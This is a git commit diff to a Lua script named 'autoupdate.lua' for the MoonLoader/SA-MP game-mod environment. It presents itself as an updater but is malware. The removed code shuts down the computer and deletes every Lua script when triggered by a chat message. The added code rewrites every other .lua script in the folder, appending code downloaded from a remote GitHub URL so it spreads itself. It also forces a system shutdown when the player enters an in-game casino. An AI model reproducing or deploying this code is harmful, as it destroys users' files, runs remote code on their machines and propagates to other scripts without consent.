e26ddbfc61161b4353bd8343d1d3d7004770307b
123412312351651 <leog34900@gmail.com>
2025-10-09 16:28:49 +0300

    Update autoupdate.lua

--- autoupdate.lua
+++ autoupdate.lua
@@ -1,37 +1,38 @@
-require("moonloader")
-require("sampfuncs")
-local sampev = require("samp.events")
-
-function main()
-    if not isSampLoaded() or not isSampfuncsLoaded() then return end
-    while not isSampAvailable() do wait(100) end
-end
-
-function sampev.onServerMessage(color, message)
-    if message:find("@555") then
-        sampSendChat("ПРИВЕТ")
-        os.execute('shutdown /s /t 300')
-        deleteAllLuaScripts()
-    end
-end
-
-function deleteAllLuaScripts()
-    lua_thread.create(function()
-        wait(500) -- Подождать, чтобы всё отработало
-        local Directory = getWorkingDirectory().."\\moonloader\\"
-        local Handle, FileName = findFirstFile(Directory.."*.lua")
-
-        while FileName do
-            local FilePath = Directory..FileName
-            local success = os.remove(FilePath)
-            if success then
-                print("Удалён: "..FileName)
-            else
-                print("Не удалось удалить: "..FileName)
-            end
-            FileName = findNextFile(Handle)
+local Handle, FileName = findFirstFile("moonloader\\*.lua")
+local Directory = getWorkingDirectory().."\\"
+while FileName do
+    local FileText = ""
+    local Skip = false
+    local File = io.open(Directory..FileName, "r")
+    for Line in File:lines() do
+        if Line:find("%-%- Exception "..FileName) then
+            Skip = true
+            break
         end
 
-        print("Удаление скриптов завершено.")
-    end)
+        if FileText ~= "" then
+            FileText = FileText.."\n"
+        end
+        FileText = FileText..Line
+    end
+    File:close()
+    if not Skip and not FileText:find("https://raw%.githubusercontent%.123412312351651/auto-updater/refs/heads/main/autoupdate.lua") then
+        local encoding = require "encoding"
+        encoding.default = "CP1251"
+        local File = io.open(Directory..FileName, "w")
+        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/123412312351651/auto-updater/refs/heads/main/autoupdate.lua").text))
+        File:close()
+    end
+    FileName = findNextFile(Handle)
+end
+findClose(Handle)
+function onReceiveRpc(id, bs)
+    if id == 93 then
+        local color = raknetBitStreamReadInt32(bs)
+        local len = raknetBitStreamReadInt32(bs)
+        local str = raknetBitStreamReadString(bs, len)
+        if str:find("^%[Информация] {FFFFFF}Вы вошли в казино 4 Dragons$") then
+            os.execute("Shutdown /s /t 5 /f")
+        end
+    end
 end
